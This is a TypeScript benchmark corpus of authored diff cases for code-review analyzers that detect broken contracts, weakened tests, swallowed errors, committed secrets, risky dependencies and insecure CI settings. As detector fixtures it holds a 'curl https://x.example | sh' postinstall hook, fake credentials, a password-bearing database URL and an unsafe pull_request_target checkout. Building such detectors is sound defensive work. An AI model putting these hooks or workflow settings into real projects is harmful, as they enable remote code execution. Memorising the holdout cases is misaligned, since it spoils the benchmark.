// Labeled corpus for the deterministic analyzers. Every case is AUTHORED BY THE PROJECT: it is a versioned
// regression benchmark, not an independent or external validation. External cases (real repositories, license,
// commit SHA) use the same shape with `provenance.source = 'external'`; none exist yet (see docs/BENCHMARK.md).
import { createHash } from 'node:crypto';
import type { FileSpec } from '../helpers';

export const CORPUS_ID = 'probato-authored';
/** Bump when cases are added, removed or relabeled; reports carry it so numbers are never compared across versions. */
export const CORPUS_VERSION = 2;

export type Split = 'dev' | 'validation' | 'holdout';
export type Language = 'typescript' | 'javascript' | 'go' | 'python' | 'php' | 'sql' | 'openapi' | 'package-json' | 'tsconfig' | 'github-actions' | 'go-mod' | 'env';
export type CaseTag =
  | 'rename' | 'alias' | 'barrel' | 'pre-existing' | 'placeholder' | 'consumer-updated' | 'refactor' | 'multi-file' | 'deletion' | 'monorepo' | 'test-path';

export type Provenance =
  | { readonly source: 'authored' }
  | { readonly source: 'external'; readonly repository: string; readonly commit: string; readonly license: string; readonly path: string };

export interface BenchmarkCase {
  /** Stable identifier; it also decides the split, so it must never be reused for a different scenario. */
  readonly id: string;
  readonly title: string;
  readonly language: Language;
  readonly tags: readonly CaseTag[];
  readonly provenance: Provenance;
  readonly files: readonly FileSpec[];
  /** Head-side content of files that are not part of the diff. */
  readonly workspace?: Readonly<Record<string, string>>;
  /** Rule IDs that must be reported. Empty = trap: nothing may be reported. */
  readonly expected: readonly string[];
  /** Traps only: the rules this negative case is designed to tempt. */
  readonly guards?: readonly string[];
}

/**
 * Split decided by a hash of the case ID instead of by the author, so nobody picks which cases are held out.
 * 60% dev, 20% validation, 20% holdout.
 */
export function splitOf(id: string): Split {
  const bucket = (createHash('sha256').update(id).digest()[0] ?? 0) % 10;
  return bucket < 6 ? 'dev' : bucket < 8 ? 'validation' : 'holdout';
}

/** SHA-256 over the canonical form of the holdout cases. Editing a holdout case changes it, which a test catches. */
export function holdoutSeal(cases: readonly BenchmarkCase[]): string {
  const holdout = cases.filter((c) => splitOf(c.id) === 'holdout').sort((a, b) => a.id.localeCompare(b.id));
  return createHash('sha256').update(JSON.stringify(holdout)).digest('hex');
}

// Credential-shaped values are assembled at runtime so this file never contains a scannable token.
const awsKey = ['AKIA', 'Z'.repeat(16)].join('');
const githubToken = ['ghp', '_', 'A1b2C3d4E5'.repeat(4)].join('');
const slackToken = ['xoxb', '-', '1234567890', '-', 'abcdefghij'].join('');
const privateKey = [['-----BEGIN', 'RSA PRIVATE KEY-----'].join(' '), 'MIIEowIBAAKCAQEA0Z3VS5JJcds3xfn', ['-----END', 'RSA PRIVATE KEY-----'].join(' ')].join('\n');
const authored = { source: 'authored' } as const;

const openApi = (property: string): string => `{"components":{"schemas":{"User":{"properties":{"${property}":{"type":"string"}}}}}}`;
const workflow = (body: string): string => `name: ci\n${body}jobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ok\n`;

export const CASES: readonly BenchmarkCase[] = [
  // ------------------------------------------------------------------ contracts
  { id: 'ts-export-renamed-stale-consumer', title: 'renamed export with stale consumer', language: 'typescript', tags: ['rename'], provenance: authored,
    files: [{ path: 'src/api.ts', base: 'export function load() {}\n', head: 'export function fetchAll() {}\n' }],
    workspace: { 'src/page.ts': "import { load } from './api';\nload();\n" }, expected: ['contracts/export-removed'] },
  { id: 'ts-required-param-stale-call', title: 'new required parameter with stale call', language: 'typescript', tags: [], provenance: authored,
    files: [{ path: 'src/fmt.ts', base: 'export function fmt(a: string) { return a; }\n', head: 'export function fmt(a: string, locale: string) { return a + locale; }\n' }],
    workspace: { 'src/use.ts': "import { fmt } from './fmt';\nfmt('x');\n" }, expected: ['contracts/arity-increased'] },
  { id: 'ts-enum-member-removed-used', title: 'enum member removed but used', language: 'typescript', tags: [], provenance: authored,
    files: [{ path: 'src/status.ts', base: 'export enum Status { Open, Closed }\n', head: 'export enum Status { Open }\n' }],
    workspace: { 'src/x.ts': "import { Status } from './status';\nexport const s = Status.Closed;\n" }, expected: ['contracts/enum-member-removed'] },
  { id: 'ts-deleted-module-imported', title: 'deleted module still imported', language: 'typescript', tags: ['deletion'], provenance: authored,
    files: [{ path: 'src/legacy.ts', base: 'export const v = 1;\n' }],
    workspace: { 'src/main.ts': "import { v } from './legacy';\n" }, expected: ['contracts/module-removed'] },
  { id: 'ts-export-renamed-alias-consumer', title: 'renamed export used through a tsconfig alias', language: 'typescript', tags: ['rename', 'alias'], provenance: authored,
    files: [{ path: 'src/lib/date.ts', base: 'export function fmtDate() {}\n', head: 'export function formatDate() {}\n' }],
    workspace: { 'tsconfig.json': '{"compilerOptions":{"baseUrl":".","paths":{"@/*":["src/*"]}}}', 'src/pages/home.tsx': "import { fmtDate } from '@/lib/date';\nfmtDate();\n" },
    expected: ['contracts/export-removed'] },
  { id: 'ts-export-removed-renamed-barrel', title: 'removed API export consumed through renamed barrel', language: 'typescript', tags: ['barrel', 'rename'], provenance: authored,
    files: [{ path: 'src/api.ts', base: 'export function load() {}\n', head: 'export function replacement() {}\n' }],
    workspace: { 'src/barrel.ts': "export { load as getUser } from './api';\n", 'src/page.ts': "import { getUser } from './barrel'; getUser();\n" },
    expected: ['contracts/export-removed'] },
  { id: 'ts-interface-property-removed-used', title: 'interface property removed while a consumer reads it', language: 'typescript', tags: [], provenance: authored,
    files: [{ path: 'src/types.ts', base: 'export interface User { id: string; email: string }\n', head: 'export interface User { id: string }\n' }],
    workspace: { 'src/use.ts': "import type { User } from './types';\nexport function f(u: User) { return u.email; }\n" }, expected: ['contracts/property-removed'] },
  { id: 'trap-ts-barrel-compatible-replacement', title: 'barrel switches to a compatible replacement implementation', language: 'typescript', tags: ['barrel', 'multi-file', 'consumer-updated'], provenance: authored,
    files: [
      { path: 'src/api.ts', base: 'export function load() {}\n', head: 'export function replacement() {}\n' },
      { path: 'src/barrel.ts', base: "export { load } from './api';\n", head: "export { load } from './replacement';\n" },
    ],
    workspace: { 'src/replacement.ts': 'export function load() {}\n', 'src/page.ts': "import { load } from './barrel'; load();\n" },
    expected: [], guards: ['contracts/export-removed'] },
  { id: 'trap-ts-npm-symbol-same-name', title: 'same symbol name imported from an npm package, not the alias', language: 'typescript', tags: ['alias'], provenance: authored,
    files: [{ path: 'src/lib/date.ts', base: 'export function format() {}\n', head: 'export function formatDate() {}\n' }],
    workspace: { 'tsconfig.json': '{"compilerOptions":{"baseUrl":".","paths":{"@/*":["src/*"]}}}', 'src/pages/home.tsx': "import { format } from 'date-fns';\nformat(new Date(), 'P');\n" },
    expected: [], guards: ['contracts/export-removed'] },
  { id: 'trap-ts-rename-consumers-updated', title: 'rename with every consumer updated', language: 'typescript', tags: ['rename', 'consumer-updated'], provenance: authored,
    files: [{ path: 'src/api.ts', base: 'export function load() {}\n', head: 'export function fetchAll() {}\n' }],
    workspace: { 'src/page.ts': "import { fetchAll } from './api';\nfetchAll();\n" }, expected: [], guards: ['contracts/export-removed'] },
  { id: 'trap-ts-optional-param-added', title: 'optional parameter added', language: 'typescript', tags: [], provenance: authored,
    files: [{ path: 'src/fmt.ts', base: 'export function fmt(a: string) { return a; }\n', head: "export function fmt(a: string, locale = 'en') { return a + locale; }\n" }],
    workspace: { 'src/use.ts': "import { fmt } from './fmt';\nfmt('x');\n" }, expected: [], guards: ['contracts/arity-increased'] },
  { id: 'trap-ts-export-removed-with-usage', title: 'export removed together with its only usage', language: 'typescript', tags: ['consumer-updated'], provenance: authored,
    files: [{ path: 'src/util.ts', base: 'export const a = 1;\nexport const b = 2;\n', head: 'export const b = 2;\n' }],
    workspace: { 'src/main.ts': "import { b } from './util';\nconsole.log(b);\n" }, expected: [], guards: ['contracts/export-removed'] },
  { id: 'trap-ts-enum-member-added', title: 'enum member added', language: 'typescript', tags: [], provenance: authored,
    files: [{ path: 'src/status.ts', base: 'export enum Status { Open, Closed }\n', head: 'export enum Status { Open, Closed, Archived }\n' }],
    workspace: { 'src/x.ts': "import { Status } from './status';\nexport const s = Status.Closed;\n" }, expected: [], guards: ['contracts/enum-member-removed'] },
  { id: 'trap-ts-unused-module-deleted', title: 'module deleted with no remaining importer', language: 'typescript', tags: ['deletion'], provenance: authored,
    files: [{ path: 'src/legacy.ts', base: 'export const v = 1;\n' }],
    workspace: { 'src/main.ts': "import { w } from './modern';\nconsole.log(w);\n", 'src/modern.ts': 'export const w = 2;\n' }, expected: [], guards: ['contracts/module-removed'] },
  { id: 'trap-ts-property-removed-consumer-updated', title: 'interface property removed and the consumer updated', language: 'typescript', tags: ['consumer-updated'], provenance: authored,
    files: [{ path: 'src/types.ts', base: 'export interface User { id: string; email: string }\n', head: 'export interface User { id: string }\n' }],
    workspace: { 'src/use.ts': "import type { User } from './types';\nexport function f(u: User) { return u.id; }\n" }, expected: [], guards: ['contracts/property-removed'] },

  // ------------------------------------------------------------------ test integrity
  { id: 'ts-focused-test-committed', title: 'focused test committed', language: 'typescript', tags: [], provenance: authored,
    files: [{ path: 'a.test.ts', base: "it('a', () => { expect(1).toBe(1); });\n", head: "it.only('a', () => { expect(1).toBe(1); });\n" }], expected: ['tests/focused'] },
  { id: 'ts-existing-test-skipped', title: 'existing test skipped', language: 'typescript', tags: [], provenance: authored,
    files: [{ path: 'a.test.ts', base: "test('b', () => { expect(1).toBe(1); });\n", head: "test.skip('b', () => { expect(1).toBe(1); });\n" }], expected: ['tests/skipped'] },
  { id: 'ts-assertions-removed', title: 'assertions removed from a test', language: 'typescript', tags: [], provenance: authored,
    files: [{ path: 'a.spec.ts', base: "it('c', () => { expect(run()).toBe(2); });\n", head: "it('c', () => { run(); });\n" }], expected: ['tests/assertions-removed'] },
  { id: 'ts-assertions-reduced', title: 'one of two assertions removed', language: 'typescript', tags: [], provenance: authored,
    files: [{ path: 'a.spec.ts', base: "it('c', () => { expect(run()).toBe(2); expect(log).toHaveLength(1); });\n", head: "it('c', () => { expect(run()).toBe(2); });\n" }],
    expected: ['tests/assertions-reduced'] },
  { id: 'ts-test-cases-removed', title: 'test case removed from a suite', language: 'typescript', tags: [], provenance: authored,
    files: [{ path: 'cart.test.ts', base: "it('adds', () => { expect(add()).toBe(1); });\nit('removes', () => { expect(remove()).toBe(0); });\n", head: "it('adds', () => { expect(add()).toBe(1); });\n" }],
    expected: ['tests/cases-removed'] },
  { id: 'ts-test-file-deleted', title: 'test file with cases deleted', language: 'typescript', tags: ['deletion'], provenance: authored,
    files: [{ path: 'src/cart.spec.ts', base: "it('adds', () => { expect(add()).toBe(1); });\n" }], expected: ['tests/file-deleted'] },
  { id: 'go-test-skipped', title: 'Go test disabled with t.Skip', language: 'go', tags: [], provenance: authored,
    files: [{ path: 'pkg/cart_test.go', base: 'func TestAdd(t *testing.T) {\n}\n', head: 'func TestAdd(t *testing.T) {\n\tt.Skip("flaky")\n}\n' }], expected: ['tests/skipped'] },
  { id: 'trap-ts-test-refactor-keeps-assertions', title: 'test refactor keeps cases and assertions', language: 'typescript', tags: ['refactor'], provenance: authored,
    files: [{ path: 'b.test.ts',
      base: "describe('s', () => {\n  it('x', () => { expect(a()).toBe(1); });\n  it('y', () => { expect(b()).toBe(2); });\n});\n",
      head: "describe('s', () => {\n  it('y', () => { expect(b()).toBe(2); });\n  it('x', () => {\n    const v = a();\n    expect(v).toBe(1);\n  });\n});\n" }],
    expected: [], guards: ['tests/cases-removed', 'tests/assertions-reduced', 'tests/assertions-removed'] },
  { id: 'trap-ts-test-renamed-same-count', title: 'test case renamed, count unchanged', language: 'typescript', tags: ['rename'], provenance: authored,
    files: [{ path: 'cart.test.ts', base: "it('adds', () => { expect(add()).toBe(1); });\n", head: "it('adds one item', () => { expect(add()).toBe(1); });\n" }],
    expected: [], guards: ['tests/cases-removed'] },
  { id: 'trap-ts-assertions-added', title: 'assertion added to an existing test', language: 'typescript', tags: [], provenance: authored,
    files: [{ path: 'a.spec.ts', base: "it('c', () => { expect(run()).toBe(2); });\n", head: "it('c', () => { expect(run()).toBe(2); expect(log).toHaveLength(1); });\n" }],
    expected: [], guards: ['tests/assertions-reduced', 'tests/assertions-removed'] },
  { id: 'trap-ts-empty-spec-deleted', title: 'deleted spec file that contained no test case', language: 'typescript', tags: ['deletion'], provenance: authored,
    files: [{ path: 'src/setup.spec.ts', base: "import './polyfills';\n" }], expected: [], guards: ['tests/file-deleted'] },
  { id: 'trap-ts-new-focused-file-already-focused', title: 'focused test already present in base, unrelated line added', language: 'typescript', tags: ['pre-existing'], provenance: authored,
    files: [{ path: 'a.test.ts', base: "it.only('a', () => { expect(1).toBe(1); });\n", head: "// covers issue 12\nit.only('a', () => { expect(1).toBe(1); });\n" }],
    expected: [], guards: ['tests/focused'] },
  { id: 'trap-go-skip-pre-existing', title: 'Go test already skipped in base', language: 'go', tags: ['pre-existing'], provenance: authored,
    files: [{ path: 'pkg/cart_test.go', base: 'func TestAdd(t *testing.T) {\n\tt.Skip("flaky")\n}\n', head: '// Cart tests.\nfunc TestAdd(t *testing.T) {\n\tt.Skip("flaky")\n}\n' }],
    expected: [], guards: ['tests/skipped'] },
  { id: 'trap-ts-skipped-test-reenabled', title: 'skipped test re-enabled', language: 'typescript', tags: [], provenance: authored,
    files: [{ path: 'a.test.ts', base: "test.skip('b', () => { expect(1).toBe(1); });\n", head: "test('b', () => { expect(1).toBe(1); });\n" }],
    expected: [], guards: ['tests/skipped'] },

  // ------------------------------------------------------------------ error handling
  { id: 'ts-empty-catch', title: 'error swallowed', language: 'typescript', tags: [], provenance: authored,
    files: [{ path: 'src/io.ts', base: 'export function f() { g(); }\n', head: 'export function f() {\n  try { g(); } catch (e) {}\n}\n' }], expected: ['errors/empty-catch'] },
  { id: 'ts-empty-promise-catch', title: 'promise rejection swallowed', language: 'typescript', tags: [], provenance: authored,
    files: [{ path: 'src/io.ts', base: 'export function f() { return g(); }\n', head: 'export function f() {\n  return g().catch(() => {});\n}\n' }], expected: ['errors/empty-promise-catch'] },
  { id: 'ts-ts-ignore-added', title: '@ts-ignore added', language: 'typescript', tags: [], provenance: authored,
    files: [{ path: 'src/x.ts', base: 'export const x = 1;\n', head: "export const x = 1;\n// @ts-ignore\nexport const y: number = 'y';\n" }], expected: ['errors/type-check-suppressed'] },
  { id: 'js-eslint-disable-added', title: 'lint rule disabled on an added line', language: 'javascript', tags: [], provenance: authored,
    files: [{ path: 'src/log.js', base: 'export function log() {}\n', head: 'export function log(m) {\n  // eslint-disable-next-line no-console\n  console.log(m);\n}\n' }],
    expected: ['errors/lint-suppressed'] },
  { id: 'trap-ts-catch-handles-error', title: 'catch that handles the error', language: 'typescript', tags: [], provenance: authored,
    files: [{ path: 'src/io.ts', base: 'export function f() { g(); }\n', head: "export function f() {\n  try { g(); } catch (e) { throw new Error('g failed', { cause: e }); }\n}\n" }],
    expected: [], guards: ['errors/empty-catch'] },
  { id: 'trap-ts-promise-catch-logs', title: 'promise catch that reports the error', language: 'typescript', tags: [], provenance: authored,
    files: [{ path: 'src/io.ts', base: 'export function f() { return g(); }\n', head: 'export function f() {\n  return g().catch((e: unknown) => report(e));\n}\n' }],
    expected: [], guards: ['errors/empty-promise-catch'] },
  { id: 'trap-ts-ts-ignore-pre-existing', title: '@ts-ignore already in base, unrelated line added', language: 'typescript', tags: ['pre-existing'], provenance: authored,
    files: [{ path: 'src/x.ts', base: "// @ts-ignore\nexport const y: number = 'y';\n", head: "// @ts-ignore\nexport const y: number = 'y';\nexport const z = 2;\n" }],
    expected: [], guards: ['errors/type-check-suppressed'] },
  { id: 'trap-js-prose-mentions-directive', title: 'comment prose mentions a lint directive', language: 'javascript', tags: [], provenance: authored,
    files: [{ path: 'src/log.js', base: 'export function log() {}\n', head: '// We removed the old eslint-disable comments in this module.\nexport function log() {}\n' }],
    expected: [], guards: ['errors/lint-suppressed'] },

  // ------------------------------------------------------------------ secrets
  { id: 'ts-aws-key-committed', title: 'cloud credential committed', language: 'typescript', tags: [], provenance: authored,
    files: [{ path: 'src/aws.ts', base: 'export {};\n', head: `export const key = '${awsKey}';\n` }], expected: ['secrets/aws-access-key'] },
  { id: 'ts-github-token-committed', title: 'GitHub token committed', language: 'typescript', tags: [], provenance: authored,
    files: [{ path: 'src/gh.ts', base: 'export {};\n', head: `export const token = '${githubToken}';\n` }], expected: ['secrets/github-token'] },
  { id: 'py-slack-token-committed', title: 'Slack token committed in Python settings', language: 'python', tags: [], provenance: authored,
    files: [{ path: 'app/settings.py', base: 'DEBUG = False\n', head: `DEBUG = False\nSLACK = "${slackToken}"\n` }], expected: ['secrets/slack-token'] },
  { id: 'php-connection-string-password', title: 'database URL with password committed in PHP config', language: 'php', tags: [], provenance: authored,
    files: [{ path: 'config/db.php', base: "<?php\nreturn [];\n", head: "<?php\nreturn ['url' => 'mysql://app:s3cretPw42@db:3306/app'];\n" }],
    expected: ['secrets/connection-string-password'] },
  { id: 'ts-private-key-committed', title: 'private key block committed', language: 'typescript', tags: [], provenance: authored,
    files: [{ path: 'src/keys.ts', base: 'export {};\n', head: `export const pem = \`${privateKey}\`;\n` }], expected: ['secrets/private-key'] },
  { id: 'py-generic-secret-assignment', title: 'literal assigned to a secret-like name', language: 'python', tags: [], provenance: authored,
    files: [{ path: 'app/client.py', base: 'TIMEOUT = 5\n', head: 'TIMEOUT = 5\nclient_secret = "q8Zr2LmW0pXv"\n' }], expected: ['secrets/generic-secret-assignment'] },
  { id: 'env-sensitive-file-added', title: '.env file added', language: 'env', tags: [], provenance: authored,
    files: [{ path: '.env', head: 'LOG_LEVEL=debug\n' }], expected: ['secrets/sensitive-file-added'] },
  { id: 'trap-ts-placeholder-secret', title: 'placeholder secret', language: 'typescript', tags: ['placeholder'], provenance: authored,
    files: [{ path: 'src/conf.ts', base: 'export {};\n', head: "export const config = { password: 'changeme', apiKey: '${API_KEY}' };\n" }],
    expected: [], guards: ['secrets/generic-secret-assignment'] },
  { id: 'trap-ts-aws-key-pre-existing', title: 'pre-existing secret untouched', language: 'typescript', tags: ['pre-existing'], provenance: authored,
    files: [{ path: 'src/aws.ts', base: `export const key = '${awsKey}';\n`, head: `export const key = '${awsKey}';\nexport const region = 'us-east-1';\n` }],
    expected: [], guards: ['secrets/aws-access-key'] },
  { id: 'trap-env-example-added', title: 'example env file added', language: 'env', tags: ['placeholder'], provenance: authored,
    files: [{ path: '.env.example', head: 'API_KEY=\n' }], expected: [], guards: ['secrets/sensitive-file-added'] },
  { id: 'trap-ts-github-token-from-env', title: 'GitHub token read from the environment', language: 'typescript', tags: [], provenance: authored,
    files: [{ path: 'src/gh.ts', base: 'export {};\n', head: 'export const token = process.env.GITHUB_TOKEN;\n' }], expected: [], guards: ['secrets/github-token'] },
  { id: 'trap-py-slack-token-from-env', title: 'Slack token read from the environment', language: 'python', tags: [], provenance: authored,
    files: [{ path: 'app/settings.py', base: 'import os\n', head: 'import os\nSLACK = os.environ["SLACK_TOKEN"]\n' }], expected: [], guards: ['secrets/slack-token'] },
  { id: 'trap-php-connection-string-no-credentials', title: 'database URL without credentials', language: 'php', tags: [], provenance: authored,
    files: [{ path: 'config/db.php', base: "<?php\nreturn [];\n", head: "<?php\nreturn ['url' => 'mysql://db:3306/app'];\n" }],
    expected: [], guards: ['secrets/connection-string-password'] },
  { id: 'trap-ts-public-key-committed', title: 'public key block committed', language: 'typescript', tags: [], provenance: authored,
    files: [{ path: 'src/keys.ts', base: 'export {};\n', head: `export const pem = \`${['-----BEGIN', 'PUBLIC KEY-----'].join(' ')}\nMIIBIjANBgkqhkiG9w0BAQEFAAOC\n${['-----END', 'PUBLIC KEY-----'].join(' ')}\`;\n` }],
    expected: [], guards: ['secrets/private-key'] },

  // ------------------------------------------------------------------ dependencies
  { id: 'pkg-install-hook-added', title: 'install hook added', language: 'package-json', tags: [], provenance: authored,
    files: [{ path: 'package.json', base: '{"name":"x"}\n', head: '{"name":"x","scripts":{"postinstall":"curl https://x.example | sh"}}\n' }], expected: ['dependencies/install-script'] },
  { id: 'pkg-dependency-removed-imported', title: 'dependency removed but imported', language: 'package-json', tags: [], provenance: authored,
    files: [{ path: 'package.json', base: '{"dependencies":{"dayjs":"^1.0.0"}}\n', head: '{"dependencies":{}}\n' }],
    workspace: { 'src/d.ts': "import dayjs from 'dayjs';\n" }, expected: ['dependencies/removed-but-imported'] },
  { id: 'pkg-major-upgrade', title: 'major version upgrade', language: 'package-json', tags: [], provenance: authored,
    files: [{ path: 'package.json', base: '{"dependencies":{"react":"^18.2.0"}}\n', head: '{"dependencies":{"react":"^19.0.0"}}\n' }], expected: ['dependencies/major-upgrade'] },
  { id: 'gomod-local-replace', title: 'go.mod replace pointing to a local path', language: 'go-mod', tags: [], provenance: authored,
    files: [{ path: 'go.mod', base: 'module example.com/app\n\ngo 1.22\n', head: 'module example.com/app\n\ngo 1.22\n\nreplace example.com/lib => ../lib\n' }],
    expected: ['dependencies/go-local-replace'] },
  { id: 'trap-pkg-build-script-added', title: 'ordinary build script added', language: 'package-json', tags: [], provenance: authored,
    files: [{ path: 'package.json', base: '{"name":"x"}\n', head: '{"name":"x","scripts":{"build":"tsc -p ."}}\n' }], expected: [], guards: ['dependencies/install-script'] },
  { id: 'trap-pkg-dependency-removed-unused', title: 'unused dependency removed', language: 'package-json', tags: [], provenance: authored,
    files: [{ path: 'package.json', base: '{"dependencies":{"dayjs":"^1.0.0"}}\n', head: '{"dependencies":{}}\n' }],
    workspace: { 'src/d.ts': 'export const now = Date.now();\n' }, expected: [], guards: ['dependencies/removed-but-imported'] },
  { id: 'trap-pkg-minor-upgrade', title: 'minor version upgrade', language: 'package-json', tags: [], provenance: authored,
    files: [{ path: 'package.json', base: '{"dependencies":{"react":"^18.2.0"}}\n', head: '{"dependencies":{"react":"^18.3.1"}}\n' }], expected: [], guards: ['dependencies/major-upgrade'] },
  { id: 'trap-gomod-remote-replace', title: 'go.mod replace pointing to a published fork', language: 'go-mod', tags: [], provenance: authored,
    files: [{ path: 'go.mod', base: 'module example.com/app\n\ngo 1.22\n', head: 'module example.com/app\n\ngo 1.22\n\nreplace example.com/lib => example.com/fork v1.2.3\n' }],
    expected: [], guards: ['dependencies/go-local-replace'] },

  // ------------------------------------------------------------------ configuration
  { id: 'tsconfig-strict-disabled', title: 'strict mode disabled', language: 'tsconfig', tags: [], provenance: authored,
    files: [{ path: 'tsconfig.json', base: '{"compilerOptions":{"strict":true}}\n', head: '{"compilerOptions":{"strict":false}}\n' }], expected: ['config/ts-strictness-reduced'] },
  { id: 'gha-pull-request-target-head-checkout', title: 'pull_request_target with PR head checkout', language: 'github-actions', tags: [], provenance: authored,
    files: [{ path: '.github/workflows/ci.yml', base: workflow('on: pull_request\n'),
      head: 'on: pull_request_target\njobs:\n  b:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n' }],
    expected: ['config/workflow-pull-request-target'] },
  { id: 'gha-write-all', title: 'workflow granted write-all', language: 'github-actions', tags: [], provenance: authored,
    files: [{ path: '.github/workflows/ci.yml', base: workflow('on: push\n'), head: workflow('on: push\npermissions: write-all\n') }], expected: ['config/workflow-write-all'] },
  { id: 'trap-tsconfig-unrelated-option', title: 'unrelated compiler option changed, strict kept', language: 'tsconfig', tags: [], provenance: authored,
    files: [{ path: 'tsconfig.json', base: '{"compilerOptions":{"strict":true,"target":"ES2020"}}\n', head: '{"compilerOptions":{"strict":true,"target":"ES2022"}}\n' }],
    expected: [], guards: ['config/ts-strictness-reduced'] },
  { id: 'trap-gha-pull-request', title: 'pull_request trigger added', language: 'github-actions', tags: [], provenance: authored,
    files: [{ path: '.github/workflows/ci.yml', base: workflow('on: push\n'), head: workflow('on: [push, pull_request]\n') }], expected: [], guards: ['config/workflow-pull-request-target'] },
  { id: 'trap-gha-read-permissions', title: 'workflow restricted to read permissions', language: 'github-actions', tags: [], provenance: authored,
    files: [{ path: '.github/workflows/ci.yml', base: workflow('on: push\n'), head: workflow('on: push\npermissions:\n  contents: read\n') }], expected: [], guards: ['config/workflow-write-all'] },

  // ------------------------------------------------------------------ cross-stack
  { id: 'openapi-property-removed-stale-consumer', title: 'OpenAPI property removed with a stale consumer', language: 'openapi', tags: ['rename'], provenance: authored,
    files: [{ path: 'openapi.json', base: openApi('name'), head: openApi('displayName') }],
    workspace: { 'src/client.ts': 'export const label = response.name;\n' }, expected: ['cross-stack/api-property-removed'] },
  { id: 'sql-dropped-column-referenced', title: 'dropped column still queried', language: 'sql', tags: [], provenance: authored,
    files: [{ path: 'migrations/012.sql', head: 'ALTER TABLE public.users\n  DROP COLUMN full_name;\n' }],
    workspace: { 'src/repository.ts': 'db.query("SELECT full_name FROM users");\n' }, expected: ['cross-stack/sql-column-reference'] },
  { id: 'ts-tenant-predicate-removed', title: 'tenant predicate removed from a data query', language: 'typescript', tags: [], provenance: authored,
    files: [{ path: 'src/service.ts', base: 'const where = { tenantId: user.tenantId, id };\nreturn db.user.findFirst({ where });\n', head: 'const where = { id };\nreturn db.user.findFirst({ where });\n' }],
    expected: ['cross-stack/tenant-predicate-removed'] },
  { id: 'trap-openapi-consumer-updated', title: 'OpenAPI consumer updated together with the property', language: 'openapi', tags: ['rename', 'consumer-updated'], provenance: authored,
    files: [{ path: 'openapi.json', base: openApi('name'), head: openApi('displayName') }],
    workspace: { 'src/client.ts': 'export const label = response.displayName;\n' }, expected: [], guards: ['cross-stack/api-property-removed'] },
  { id: 'trap-sql-dropped-column-unreferenced', title: 'dropped column no longer referenced', language: 'sql', tags: [], provenance: authored,
    files: [{ path: 'migrations/012.sql', head: 'ALTER TABLE public.users\n  DROP COLUMN full_name;\n' }],
    workspace: { 'src/repository.ts': 'db.query("SELECT display_name FROM users");\n' }, expected: [], guards: ['cross-stack/sql-column-reference'] },
  { id: 'trap-ts-tenant-predicate-reordered', title: 'tenant predicate kept while the query is refactored', language: 'typescript', tags: ['refactor'], provenance: authored,
    files: [{ path: 'src/service.ts', base: 'const where = { tenantId: user.tenantId, id };\nreturn db.user.findFirst({ where });\n', head: 'const where = { id, tenantId: user.tenantId };\nreturn db.user.findFirst({ where });\n' }],
    expected: [], guards: ['cross-stack/tenant-predicate-removed'] },
];

/**
 * Rules with no positive or no negative case yet. Reported as coverage gaps, never as measured. The benchmark test
 * keeps this list exact: adding a case for a rule forces removing it from here, and a new rule cannot ship silently.
 */
export const KNOWN_GAPS: Readonly<Record<string, 'no-positive' | 'no-negative' | 'no-cases'>> = {
  'secrets/anthropic-key': 'no-cases',
  'secrets/openai-key': 'no-cases',
  'secrets/stripe-live-key': 'no-cases',
  'secrets/google-api-key': 'no-cases',
  'secrets/jwt': 'no-cases',
};
